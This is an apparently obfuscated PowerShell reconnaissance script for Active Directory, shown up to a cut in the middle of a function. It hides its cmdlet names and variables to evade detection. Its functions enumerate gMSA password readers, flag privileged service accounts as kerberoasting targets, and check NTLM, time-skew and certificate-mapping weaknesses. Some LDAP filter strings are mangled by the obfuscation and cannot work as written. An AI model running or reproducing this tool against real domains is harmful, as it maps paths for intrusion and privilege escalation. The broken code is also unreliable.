function Get-GmsaReadersReport {
  param(
    [System.DirectoryServices.ActiveDirectory.Domain]$DomainContext
  )
  if (-not $DomainContext) { return @() }
  $XTlmLmIVmbziIeqmqVDhzFPrvwKvIyxqaMXgQbBsatzrqhQpXgNaLGMsveWafLfpeLYRwPGDFNtJzLJjjjOLPamRvWmKSKFXcHIm = $DomainContext.GetDirectoryEntry().distinguishedName
  try {
    $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn = &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') System.DirectoryServices.DirectorySearcher
    $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.SearchRoot = &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') System.DirectoryServices.DirectoryEntry("LDAP://$XTlmLmIVmbziIeqmqVDhzFPrvwKvIyxqaMXgQbBsatzrqhQpXgNaLGMsveWafLfpeLYRwPGDFNtJzLJjjjOLPamRvWmKSKFXcHIm")
    $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.Filter = "(&(objectClass=&('m' + 's' + 'D' + 'S' + '-' + 'G' + 'r' + 'o' + 'u' + 'p' + 'M' + 'a' + 'n' + 'a' + 'g' + 'e' + 'd' + 'S' + 'e' + 'r' + 'v' + 'i' + 'c' + 'e' + 'A' + 'c' + 'c' + 'o' + 'u' + 'n' + 't')))"
    $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.PageSize = 500
    [void]$SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.PropertiesToLoad.Add("sAMAccountName")
    [void]$SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.PropertiesToLoad.Add("&('m' + 's' + 'D' + 'S' + '-' + 'G' + 'r' + 'o' + 'u' + 'p' + 'M' + 'S' + 'A' + 'M' + 'e' + 'm' + 'b' + 'e' + 'r' + 's' + 'h' + 'i' + 'p')")
    $LewKCDANPvLPyYnjKsuyIrMeyLMtEWljJFDLUXWAgEMmFETSfwLeptWafeFwFVVvhWUuSuxwyTIvAyuTzwpmTeEoCqacGEWwmRfz = $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.FindAll()
  }
  catch { return @() }
  $VTvQdPGGxBROYIAnivIOcJBPLRPBNhcZRAgkLQbSayVSBrDtaDICaVecfJlvxPGQNqvDwPesJLnlSrbgCIAzBAqQZmVhEGbfYHDL = @()
  foreach ($KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk in $LewKCDANPvLPyYnjKsuyIrMeyLMtEWljJFDLUXWAgEMmFETSfwLeptWafeFwFVVvhWUuSuxwyTIvAyuTzwpmTeEoCqacGEWwmRfz) {
    $ssWkiSwkzsOuwAmGtJjPCftbmJwyjHNcWRZFyInHsPKlHnKXGPHvaqWQuNfvzUJOctlmBKWPkqXsQtHpvTQWzuLkGMoVivreXkDz = $KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk.Properties["samaccountname"]
    $eNayBENqYKVTgxEpLqCJEnwnZLtDeLmFkpgQvrpmENiUXPuKerrIbnpSjoXRiSwhThaoxMTcHPZiBJLeBXUhclyvlckUcQugtgwJ = $KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk.Properties["&('m' + 's' + 'd' + 's' + '-' + 'g' + 'r' + 'o' + 'u' + 'p' + 'm' + 's' + 'a' + 'm' + 'e' + 'm' + 'b' + 'e' + 'r' + 's' + 'h' + 'i' + 'p')"]
    if (-not $eNayBENqYKVTgxEpLqCJEnwnZLtDeLmFkpgQvrpmENiUXPuKerrIbnpSjoXRiSwhThaoxMTcHPZiBJLeBXUhclyvlckUcQugtgwJ) { continue }
    $JLldzXuQEsPMcmNrTpcPMLmrUHwWlkAaROLhECOOGUQGJZAEyraDqNYfqGrsQxMiuaoPcozjoGoPOzQpvBEybDzhJRBpVLoBiJhl = @()
    foreach ($ejCcofgGftBhDJnBEFeVBlzYFQCrhFChbaZTRfHlYFUEcNCokdxGYDpqSgWKJeHGTMNnqraJnFLMzSmEuiiIOqkYwrsnmMGRYRnr in $eNayBENqYKVTgxEpLqCJEnwnZLtDeLmFkpgQvrpmENiUXPuKerrIbnpSjoXRiSwhThaoxMTcHPZiBJLeBXUhclyvlckUcQugtgwJ) {
      try {
        $crgAkIAtxHQNATgRqgoqCOBozZTXOcItrhVghuuSmEwaxrGHgWlEwCBsCAMAENmWBjAkxqNFzzjeAJCvtwMosltoCaWKoSRgmFTB = &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') System.Security.AccessControl.RawSecurityDescriptor (, $ejCcofgGftBhDJnBEFeVBlzYFQCrhFChbaZTRfHlYFUEcNCokdxGYDpqSgWKJeHGTMNnqraJnFLMzSmEuiiIOqkYwrsnmMGRYRnr)
        foreach ($UqmWKdxKBxZdXgnmrtkyxJwIqiGqlCRJmXsPkAVUhngYtpedbOMKOjqUjiRVAsWpUSzmTApzrgiFlZtideOYJkjjfzgXMhZCwHCi in $crgAkIAtxHQNATgRqgoqCOBozZTXOcItrhVghuuSmEwaxrGHgWlEwCBsCAMAENmWBjAkxqNFzzjeAJCvtwMosltoCaWKoSRgmFTB.DiscretionaryAcl) {
          $aUScHKAaNKqkQpRahlUhGjghAUTUwhyWXLyHSlEbKzPPpbTWYAODYYarFbhPgHiWoZUUtNwcTuRWvzCYeUwylPIqmGcOYFhKJLLd = &('C' + 'o' + 'n' + 'v' + 'e' + 'r' + 't' + '-' + 'S' + 'i' + 'd' + 'T' + 'o' + 'N' + 'a' + 'm' + 'e') $UqmWKdxKBxZdXgnmrtkyxJwIqiGqlCRJmXsPkAVUhngYtpedbOMKOjqUjiRVAsWpUSzmTApzrgiFlZtideOYJkjjfzgXMhZCwHCi.SecurityIdentifier
          if ($aUScHKAaNKqkQpRahlUhGjghAUTUwhyWXLyHSlEbKzPPpbTWYAODYYarFbhPgHiWoZUUtNwcTuRWvzCYeUwylPIqmGcOYFhKJLLd) { $JLldzXuQEsPMcmNrTpcPMLmrUHwWlkAaROLhECOOGUQGJZAEyraDqNYfqGrsQxMiuaoPcozjoGoPOzQpvBEybDzhJRBpVLoBiJhl += $aUScHKAaNKqkQpRahlUhGjghAUTUwhyWXLyHSlEbKzPPpbTWYAODYYarFbhPgHiWoZUUtNwcTuRWvzCYeUwylPIqmGcOYFhKJLLd }
        }
      }
      catch { continue }
    }
    if ($JLldzXuQEsPMcmNrTpcPMLmrUHwWlkAaROLhECOOGUQGJZAEyraDqNYfqGrsQxMiuaoPcozjoGoPOzQpvBEybDzhJRBpVLoBiJhl.Count -eq 0) { continue }
    $JLldzXuQEsPMcmNrTpcPMLmrUHwWlkAaROLhECOOGUQGJZAEyraDqNYfqGrsQxMiuaoPcozjoGoPOzQpvBEybDzhJRBpVLoBiJhl = $JLldzXuQEsPMcmNrTpcPMLmrUHwWlkAaROLhECOOGUQGJZAEyraDqNYfqGrsQxMiuaoPcozjoGoPOzQpvBEybDzhJRBpVLoBiJhl | &('S' + 'o' + 'r' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -Unique
    $KYFVHMBrtSJZyIGVslJRVNwGcajGVdJYgvRbjoAxSEaXPNgTNDbyXhwyMsxahSVVsrzaXdtLNqnXAXxliTEmhGJPRrTvJuaDWwKf = $JLldzXuQEsPMcmNrTpcPMLmrUHwWlkAaROLhECOOGUQGJZAEyraDqNYfqGrsQxMiuaoPcozjoGoPOzQpvBEybDzhJRBpVLoBiJhl | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $_ -match 'Domain Users|Authenticated Users|Everyone' }
    $VTvQdPGGxBROYIAnivIOcJBPLRPBNhcZRAgkLQbSayVSBrDtaDICaVecfJlvxPGQNqvDwPesJLnlSrbgCIAzBAqQZmVhEGbfYHDL += [pscustomobject]@{
      Account        = ($ssWkiSwkzsOuwAmGtJjPCftbmJwyjHNcWRZFyInHsPKlHnKXGPHvaqWQuNfvzUJOctlmBKWPkqXsQtHpvTQWzuLkGMoVivreXkDz | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -First 1)
      Allowed        = ($JLldzXuQEsPMcmNrTpcPMLmrUHwWlkAaROLhECOOGUQGJZAEyraDqNYfqGrsQxMiuaoPcozjoGoPOzQpvBEybDzhJRBpVLoBiJhl -join ", ")
      WeakPrincipals = if ($KYFVHMBrtSJZyIGVslJRVNwGcajGVdJYgvRbjoAxSEaXPNgTNDbyXhwyMsxahSVVsrzaXdtLNqnXAXxliTEmhGJPRrTvJuaDWwKf) { $KYFVHMBrtSJZyIGVslJRVNwGcajGVdJYgvRbjoAxSEaXPNgTNDbyXhwyMsxahSVVsrzaXdtLNqnXAXxliTEmhGJPRrTvJuaDWwKf -join ", " } else { "" }
    }
  }
  return $VTvQdPGGxBROYIAnivIOcJBPLRPBNhcZRAgkLQbSayVSBrDtaDICaVecfJlvxPGQNqvDwPesJLnlSrbgCIAzBAqQZmVhEGbfYHDL
}

function Get-PrivilegedSpnTargets {
  param(
    [System.DirectoryServices.ActiveDirectory.Domain]$DomainContext
  )
  if (-not $DomainContext) { return @() }
  $XTlmLmIVmbziIeqmqVDhzFPrvwKvIyxqaMXgQbBsatzrqhQpXgNaLGMsveWafLfpeLYRwPGDFNtJzLJjjjOLPamRvWmKSKFXcHIm = $DomainContext.GetDirectoryEntry().distinguishedName
  $XVHvetaNARmRsTozkoIIKyhLivqpJVWJCOxdROTQYMYOApNLPZqjPNzIVkmXQTlWPpCVPXkTDXELFPBZrHFtNSlmcXZWtUnqmSWt = @(
    "Domain Admin",
    "Enterprise Admin",
    "Administrators",
    "Exchange",
    "IT_",
    "Schema Admin",
    "Account Operator",
    "Server Operator",
    "Backup Operator",
    "DnsAdmin"
  )
  try {
    $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn = &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') System.DirectoryServices.DirectorySearcher
    $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.SearchRoot = &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') System.DirectoryServices.DirectoryEntry("LDAP://$XTlmLmIVmbziIeqmqVDhzFPrvwKvIyxqaMXgQbBsatzrqhQpXgNaLGMsveWafLfpeLYRwPGDFNtJzLJjjjOLPamRvWmKSKFXcHIm")
    $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.Filter = "(&(objectClass=user)(servicePrincipalName=*))"
    $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.PageSize = 500
    [void]$SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.PropertiesToLoad.Add("sAMAccountName")
    [void]$SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.PropertiesToLoad.Add("memberOf")
    $LewKCDANPvLPyYnjKsuyIrMeyLMtEWljJFDLUXWAgEMmFETSfwLeptWafeFwFVVvhWUuSuxwyTIvAyuTzwpmTeEoCqacGEWwmRfz = $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.FindAll()
  }
  catch { return @() }
  $coDbZsElkSZqNzEBOdwXiByTLXVmyNngQWpUgzCwckQypAQZwIDNfYaAsvqWgJteRhBjsfFZgIBShwyTErtpfEbKOjQMkldWzMKg = @()
  foreach ($IsfzgtNslVcgdCcsZVCaHfvyiXVFQlTQyRgStvCeYwhtXzOxXpDrPytnAOTjfRAvzHmrkuLFRDAiHkODLuZlNeHViBpypmZDSsIs in $LewKCDANPvLPyYnjKsuyIrMeyLMtEWljJFDLUXWAgEMmFETSfwLeptWafeFwFVVvhWUuSuxwyTIvAyuTzwpmTeEoCqacGEWwmRfz) {
    $mVZbivJNVLYGKWmLgotlNITNJjQFmciVorEJKmonZnNthRNaoyWWZSyqntSjjfZZyrysccFFcsEOWncbnQOZczuURtkxUsysLrUm = $IsfzgtNslVcgdCcsZVCaHfvyiXVFQlTQyRgStvCeYwhtXzOxXpDrPytnAOTjfRAvzHmrkuLFRDAiHkODLuZlNeHViBpypmZDSsIs.Properties["memberof"]
    if (-not $mVZbivJNVLYGKWmLgotlNITNJjQFmciVorEJKmonZnNthRNaoyWWZSyqntSjjfZZyrysccFFcsEOWncbnQOZczuURtkxUsysLrUm) { continue }
    $xIOkmyzuFPaLOvpaiysXHWJTWfwtteqIJaeKQKynylHoeDGlWfhampUigBRVaAEAxPNTclVTRKCjIqaWCByavaNlfgMWteOBtUkN = @()
    foreach ($wFBAFQoYZtjAOEKqAtTBrcRROngnYQEryXqfmimdHyKcmapmnhuWeOSaLuZFSXmcSuYlbWtuMTIJzctyxrzuZLXQmNeLhvIqhcmp in $mVZbivJNVLYGKWmLgotlNITNJjQFmciVorEJKmonZnNthRNaoyWWZSyqntSjjfZZyrysccFFcsEOWncbnQOZczuURtkxUsysLrUm) {
      $deQXCdRJpBlHnQqEocnPpkTXhueycMfZRnkBRgxCBTMqWQQYmYNUKtkZGMbGysYmBFxRmhIRKYogZzGbgGqBbMbBFhjznuqzUqxA = ($wFBAFQoYZtjAOEKqAtTBrcRROngnYQEryXqfmimdHyKcmapmnhuWeOSaLuZFSXmcSuYlbWtuMTIJzctyxrzuZLXQmNeLhvIqhcmp -split ',')[0] -replace '^CN=',''
      if ($XVHvetaNARmRsTozkoIIKyhLivqpJVWJCOxdROTQYMYOApNLPZqjPNzIVkmXQTlWPpCVPXkTDXELFPBZrHFtNSlmcXZWtUnqmSWt | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $deQXCdRJpBlHnQqEocnPpkTXhueycMfZRnkBRgxCBTMqWQQYmYNUKtkZGMbGysYmBFxRmhIRKYogZzGbgGqBbMbBFhjznuqzUqxA -like "*${_}*" }) {
        $xIOkmyzuFPaLOvpaiysXHWJTWfwtteqIJaeKQKynylHoeDGlWfhampUigBRVaAEAxPNTclVTRKCjIqaWCByavaNlfgMWteOBtUkN += $deQXCdRJpBlHnQqEocnPpkTXhueycMfZRnkBRgxCBTMqWQQYmYNUKtkZGMbGysYmBFxRmhIRKYogZzGbgGqBbMbBFhjznuqzUqxA
      }
    }
    if ($xIOkmyzuFPaLOvpaiysXHWJTWfwtteqIJaeKQKynylHoeDGlWfhampUigBRVaAEAxPNTclVTRKCjIqaWCByavaNlfgMWteOBtUkN.Count -gt 0) {
      $coDbZsElkSZqNzEBOdwXiByTLXVmyNngQWpUgzCwckQypAQZwIDNfYaAsvqWgJteRhBjsfFZgIBShwyTErtpfEbKOjQMkldWzMKg += [pscustomobject]@{
        User   = ($IsfzgtNslVcgdCcsZVCaHfvyiXVFQlTQyRgStvCeYwhtXzOxXpDrPytnAOTjfRAvzHmrkuLFRDAiHkODLuZlNeHViBpypmZDSsIs.Properties["samaccountname"] | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -First 1)
        Groups = ($xIOkmyzuFPaLOvpaiysXHWJTWfwtteqIJaeKQKynylHoeDGlWfhampUigBRVaAEAxPNTclVTRKCjIqaWCByavaNlfgMWteOBtUkN | &('S' + 'o' + 'r' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -Unique) -join ', '
      }
    }
  }
  return ($coDbZsElkSZqNzEBOdwXiByTLXVmyNngQWpUgzCwckQypAQZwIDNfYaAsvqWgJteRhBjsfFZgIBShwyTErtpfEbKOjQMkldWzMKg | &('S' + 'o' + 'r' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') User | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -First 12)
}

function Get-NtlmPolicySummary {
  try {
    $OkgpsOVmmEPgwguqTwcCPzoSkefstjTDafSWHkglmgiWQqFZmdzxqaRfDadsfEIZtAiqJZlqXYIqWhJkeGZYDBjvwKcXzZKfzZOY = &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0' -ErrorAction Stop
  }
  catch { return $null }
  $CxgkXDlpSSDoRykVectQeAXQxoXiulAvZUQylHifzRnSCuLxgRPqvjZkvyFIScvOmDzODkJVEVvVmfrMZLrteUsikgGmWMvAlKzE = &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -ErrorAction SilentlyContinue
  return [pscustomobject]@{
    RestrictReceiving = $OkgpsOVmmEPgwguqTwcCPzoSkefstjTDafSWHkglmgiWQqFZmdzxqaRfDadsfEIZtAiqJZlqXYIqWhJkeGZYDBjvwKcXzZKfzZOY.RestrictReceivingNTLMTraffic
    RestrictSending   = $OkgpsOVmmEPgwguqTwcCPzoSkefstjTDafSWHkglmgiWQqFZmdzxqaRfDadsfEIZtAiqJZlqXYIqWhJkeGZYDBjvwKcXzZKfzZOY.RestrictSendingNTLMTraffic
    LmCompatibility   = if ($CxgkXDlpSSDoRykVectQeAXQxoXiulAvZUQylHifzRnSCuLxgRPqvjZkvyFIScvOmDzODkJVEVvVmfrMZLrteUsikgGmWMvAlKzE) { $CxgkXDlpSSDoRykVectQeAXQxoXiulAvZUQylHifzRnSCuLxgRPqvjZkvyFIScvOmDzODkJVEVvVmfrMZLrteUsikgGmWMvAlKzE.LmCompatibilityLevel } else { $null }
  }
}

function Get-TimeSkewInfo {
  param(
    [System.DirectoryServices.ActiveDirectory.Domain]$DomainContext
  )
  if (-not $DomainContext) { return $null }
  try {
    $kcaHjjWlxCNDNSRNqrgGVnTPtHfIBeMecpWKRFfinsWCHoUHTQSsLkVFWDOHiWBEHMagQnGMawJLVqtRGADXZNGaLQnduIclYBVj = $DomainContext.PdcRoleOwner.Name
  }
  catch { return $null }
  try {
    $SSYgkUfOMjqityGygpyEFfogtoRrnpXjWpihZnXyxlwBofmNFohmfbuhhyqcWaLMGBXasvdkMuhvVPyfgKazVDQZodGniVcolzMM = w32tm /stripchart /computer:$kcaHjjWlxCNDNSRNqrgGVnTPtHfIBeMecpWKRFfinsWCHoUHTQSsLkVFWDOHiWBEHMagQnGMawJLVqtRGADXZNGaLQnduIclYBVj /dataonly /samples:3 2>$null
    $PUtrMekzsyOFwSTggEkZdyqXEXyhtPIkagebWdanaARTXIGXlRWGLcrrGrqTPQjUlZVAiovMSidSCQqRYYRwZcgTrxDwdgBJumQP = $SSYgkUfOMjqityGygpyEFfogtoRrnpXjWpihZnXyxlwBofmNFohmfbuhhyqcWaLMGBXasvdkMuhvVPyfgKazVDQZodGniVcolzMM | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $_ -match ',' } | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -Last 1
    if (-not $PUtrMekzsyOFwSTggEkZdyqXEXyhtPIkagebWdanaARTXIGXlRWGLcrrGrqTPQjUlZVAiovMSidSCQqRYYRwZcgTrxDwdgBJumQP) { return $null }
    $JrZCQMZIfYbwxCAdHJjPpxDGtBzpcEnXMPvMHKgzatrLjsbqoTKyMZfcLfYSGCnYhOMUIUycqvHpVOclJCsBMTLOLLvptgyvYDJm = $PUtrMekzsyOFwSTggEkZdyqXEXyhtPIkagebWdanaARTXIGXlRWGLcrrGrqTPQjUlZVAiovMSidSCQqRYYRwZcgTrxDwdgBJumQP.Split(',')
    if ($JrZCQMZIfYbwxCAdHJjPpxDGtBzpcEnXMPvMHKgzatrLjsbqoTKyMZfcLfYSGCnYhOMUIUycqvHpVOclJCsBMTLOLLvptgyvYDJm.Count -lt 2) { return $null }
    $kJmGKwwYpPCPvafOffPxeWEedzqynFtbiLzOeaWBgKlBbIGtsmVnwTmtsemnTbaWxeaJGnaAYGfRGZascjhlsReWBFfSlnHAFWyZ = $JrZCQMZIfYbwxCAdHJjPpxDGtBzpcEnXMPvMHKgzatrLjsbqoTKyMZfcLfYSGCnYhOMUIUycqvHpVOclJCsBMTLOLLvptgyvYDJm[1].Trim().TrimEnd('s')
    [double]$fBUTPKXHMphgDBIAwpKCzKlQbSEAYziovmcshLiFbexHIbYcuVFzPkUnjvOIaAcBYntyJuWzxAiergRgIQfrqgLXGmGvElmfkMyW = 0
    if (-not [double]::TryParse($kJmGKwwYpPCPvafOffPxeWEedzqynFtbiLzOeaWBgKlBbIGtsmVnwTmtsemnTbaWxeaJGnaAYGfRGZascjhlsReWBFfSlnHAFWyZ, [ref]$fBUTPKXHMphgDBIAwpKCzKlQbSEAYziovmcshLiFbexHIbYcuVFzPkUnjvOIaAcBYntyJuWzxAiergRgIQfrqgLXGmGvElmfkMyW)) { return $null }
    return [pscustomobject]@{
      Source        = $kcaHjjWlxCNDNSRNqrgGVnTPtHfIBeMecpWKRFfinsWCHoUHTQSsLkVFWDOHiWBEHMagQnGMawJLVqtRGADXZNGaLQnduIclYBVj
      OffsetSeconds = $fBUTPKXHMphgDBIAwpKCzKlQbSEAYziovmcshLiFbexHIbYcuVFzPkUnjvOIaAcBYntyJuWzxAiergRgIQfrqgLXGmGvElmfkMyW
      RawSample     = $PUtrMekzsyOFwSTggEkZdyqXEXyhtPIkagebWdanaARTXIGXlRWGLcrrGrqTPQjUlZVAiovMSidSCQqRYYRwZcgTrxDwdgBJumQP
    }
  }
  catch {
    return $null
  }
}

function Get-AdcsSchannelInfo {
  $GryPsPCGqErsiUdobuOIrvaoasdeVMiwILfoVcguSnJVXaLosGZjFrklOQCcihHkchxNuNLamIVTdzrnisLaqpzGKDYGHhyRxOon = [ordered]@{
    MappingValue = $null
    UpnMapping   = $false
    ServiceState = $null
  }
  try {
    $yqGJMEGWRFIYdCobbVTukDuGQRrKOQEEvtLkyyEZszBxsKLhEqmrwMJjPCpvaFFtwwQTDoyOSvaTVyvDEqHXuTCVVBzbAKOQXWnL = &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL' -Name 'CertificateMappingMethods' -ErrorAction Stop
    $GryPsPCGqErsiUdobuOIrvaoasdeVMiwILfoVcguSnJVXaLosGZjFrklOQCcihHkchxNuNLamIVTdzrnisLaqpzGKDYGHhyRxOon.MappingValue = $yqGJMEGWRFIYdCobbVTukDuGQRrKOQEEvtLkyyEZszBxsKLhEqmrwMJjPCpvaFFtwwQTDoyOSvaTVyvDEqHXuTCVVBzbAKOQXWnL.CertificateMappingMethods
    if (($yqGJMEGWRFIYdCobbVTukDuGQRrKOQEEvtLkyyEZszBxsKLhEqmrwMJjPCpvaFFtwwQTDoyOSvaTVyvDEqHXuTCVVBzbAKOQXWnL.CertificateMappingMethods -band 0x4) -eq 0x4) { $GryPsPCGqErsiUdobuOIrvaoasdeVMiwILfoVcguSnJVXaLosGZjFrklOQCcihHkchxNuNLamIVTdzrnisLaqpzGKDYGHhyRxOon.UpnMapping = $true }
  }
  catch { }
  $iSKrmRdMuINLuBlBvrFwnpqRXclRnzvRtiAdcZlUQhtoaPzlbcNFfDABLYPzXCzQQPaGmNGjqvZNrDzqAKbLlQyYgKAfMNjbiRjS = &('G' + 'e' + 't' + '-' + 'S' + 'e' + 'r' + 'v' + 'i' + 'c' + 'e') -Name certsrv -ErrorAction SilentlyContinue
  if ($iSKrmRdMuINLuBlBvrFwnpqRXclRnzvRtiAdcZlUQhtoaPzlbcNFfDABLYPzXCzQQPaGmNGjqvZNrDzqAKbLlQyYgKAfMNjbiRjS) { $GryPsPCGqErsiUdobuOIrvaoasdeVMiwILfoVcguSnJVXaLosGZjFrklOQCcihHkchxNuNLamIVTdzrnisLaqpzGKDYGHhyRxOon.ServiceState = $iSKrmRdMuINLuBlBvrFwnpqRXclRnzvRtiAdcZlUQhtoaPzlbcNFfDABLYPzXCzQQPaGmNGjqvZNrDzqAKbLlQyYgKAfMNjbiRjS.Status }
  return [pscustomobject]$GryPsPCGqErsiUdobuOIrvaoasdeVMiwILfoVcguSnJVXaLosGZjFrklOQCcihHkchxNuNLamIVTdzrnisLaqpzGKDYGHhyRxOon
}


function Search-Excel {
  [cmdletbinding()]
  Param (
      [parameter(Mandatory, ValueFromPipeline)]
      [ValidateScript({
          Try {
              If (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') -Path $_) {$True}
              Else {Throw "$($_) is not a valid path!"}
          }
          Catch {
              Throw $_
          }
      })]
      [string]$Source,
      [parameter(Mandatory)]
      [string]$SearchText
  )
  $Excel = &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -ComObject Excel.Application
  Try {
      $Source = &('C' + 'o' + 'n' + 'v' + 'e' + 'r' + 't' + '-' + 'P' + 'a' + 't' + 'h') $Source
  }
  Catch {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'W' + 'a' + 'r' + 'n' + 'i' + 'n' + 'g') "Unable locate full path of $($Source)"
      BREAK
  }
  $AxUGThlSwsARXLReYTWoRiZhLjYpCJgYGlgHklXAvMzcKmYvNLgJYpuUCVTZkLuoWJZcGDAcPQDFlERHKZxQzUApfLUEPQqSMydd = $Excel.Workbooks.Open($Source)
  ForEach ($KrWqmbWNXMJxXUBQlYiwmzhLIFZuznogRDaDKjQpGAYJaMPhJWhLVsWWdYkZYEHhGwHsfZLkRYjodpZsQLXglcjSOKKwRYrjvIHl in @($AxUGThlSwsARXLReYTWoRiZhLjYpCJgYGlgHklXAvMzcKmYvNLgJYpuUCVTZkLuoWJZcGDAcPQDFlERHKZxQzUApfLUEPQqSMydd.Sheets)) {
      $BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn = $KrWqmbWNXMJxXUBQlYiwmzhLIFZuznogRDaDKjQpGAYJaMPhJWhLVsWWdYkZYEHhGwHsfZLkRYjodpZsQLXglcjSOKKwRYrjvIHl.Cells.Find($SearchText)
      If ($BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn) {
        try{  
          &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Pattern: '$SearchText' found in $source" -ForegroundColor Blue
          $BTuSlyDsVcCEbYrEFpFkuMUsbqLdpUQiyWZUpcefmZWrDbOJsvuWdXwLWXzIXerbGSwAnNPQuWrbBmHnluAOovFczUonPlHHFHtp = $BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn.Address(0,0,1,1)
          &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -TypeName PSObject -Property ([Ordered]@{
              WorkSheet = $KrWqmbWNXMJxXUBQlYiwmzhLIFZuznogRDaDKjQpGAYJaMPhJWhLVsWWdYkZYEHhGwHsfZLkRYjodpZsQLXglcjSOKKwRYrjvIHl.Name
